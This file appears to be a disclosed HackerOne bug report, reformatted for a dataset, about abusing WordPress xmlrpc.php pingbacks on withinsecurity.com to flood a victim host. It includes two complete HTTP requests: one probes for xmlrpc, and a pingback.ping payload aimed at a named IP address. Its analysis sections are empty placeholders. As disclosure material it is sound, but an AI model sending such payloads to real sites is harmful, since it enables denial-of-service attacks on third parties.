@@ -1,0 +1,102 @@
+---
+source: hackerone
+dataset: elamaran619/hackerone_disclosed_reports
+h1_id: '96294'
+original_report_id: '96294'
+title: DDOS using xmlrpc.php
+weakness: Uncontrolled Resource Consumption
+team_handle: withinsecurity
+created_at: '2015-10-28T08:05:12.419Z'
+disclosed_at: '2015-10-29T19:28:24.793Z'
+has_bounty: false
+visibility: full
+substate: resolved
+vote_count: 7
+tags:
+- hackerone
+- uncontrolled-resource-consumption
+---
+
+# DDOS using xmlrpc.php
+
+## Metadata
+
+- HackerOne Report ID: 96294
+- Weakness: Uncontrolled Resource Consumption
+- Program: withinsecurity
+- Disclosed At: 2015-10-29T19:28:24.793Z
+- Has Bounty: No
+- Visibility: full
+- Substate: resolved
+
+## Original Report
+
+Wordpress blogs that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS. The blog at withinsecurity.com has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other victim hosts.
+
+* In order to determine whether the xmlrpc.php file is enabled or not, using the Repeater tab in Burp, send the request below. See screenshot 1: 
+
+```
+POST /xmlrpc.php HTTP/1.1 
+Host: withinsecurity.com 
+Connection: keep-alive 
+Content-Length: 175
+
+<?xml version="1.0" encoding="utf-8"?> 
+<methodCall> 
+<methodName>demo.sayHello</methodName> 
+<params> 
+<param>
+<value>admin</value>
+</param> 
+</params> 
+</methodCall>
+```
+
+* Notice that a successful response is received showing that the xmlrpc.php file is enabled. 
+
+* Now, considering the blog post `https://withinsecurity.com/2015/10/is-there-really-a-cybersecurity-skills-gap/` on the withinsecurity.com domain, the xmlrpc.php file discussed above could potentially be abused to cause a DDOS attack against a victim host. This is achieved by simply sending a request that looks like below. See Screenshot 2: 
+
+```
+POST /xmlrpc.php HTTP/1.1 
+Host: withinsecurity.com 
+Connection: keep-alive 
+Content-Length: 293
+
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params>
+<param>
+<value><string>http://173.243.56.36/</string></value>
+</param>
+<param>
+<value><string>https://withinsecurity.com/2015/10/is-there-really-a-cybersecurity-skills-gap/</string></value>
+</param>
+</params>
+</methodCall>
+```
+
+* As soon as the above request is sent, the victim host (173.243.56.36) gets an entry in its log file with a request originating from the withinsecurity.com domain verifying the pingback. See screenshot 3.
+
+This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.
+
+## Extracted Security Notes
+
+### Likely Vulnerability Class
+
+*Leave this section for future enrichment.*
+
+### Likely Root Cause
+
+*Leave this section for future enrichment.*
+
+### Potential Impact
+
+*Leave this section for future enrichment.*
+
+### Defensive Test Cases
+
+*Leave this section for future enrichment.*
+
+### Remediation Ideas
+
+*Leave this section for future enrichment.*
